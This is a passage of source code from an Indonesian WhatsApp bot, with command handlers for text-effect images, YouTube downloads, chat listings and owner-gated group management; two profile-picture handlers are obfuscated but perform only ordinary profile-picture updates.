if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(m.chat, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'drapwater': case 'water':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'q': case 'quoted': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (!isRegistered) return replyReg(mess.verif)
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'tagall': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
db.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break

//=================================================//
 case 'group': case 'grup': {
 if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (!isRegistered) return replyReg(mess.verif)
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
const anmu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Group`,
}
haikal.sendMessage(m.chat, anmu, `Mode Group Contoh : Group On / Group Off`, haikal.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 const anju = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Edit Info`,
}
haikal.sendMessage(m.chat, anju, `Mode Edit Info Contoh : editinfo On / editinfo Off`, haikal.user.name, m)
}
}
break
case 'setppbot': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
case 'block': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//

case 'ss': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'public': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.public = false
reply('Sukses Change To Self')
}
break
case 'listcmd': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
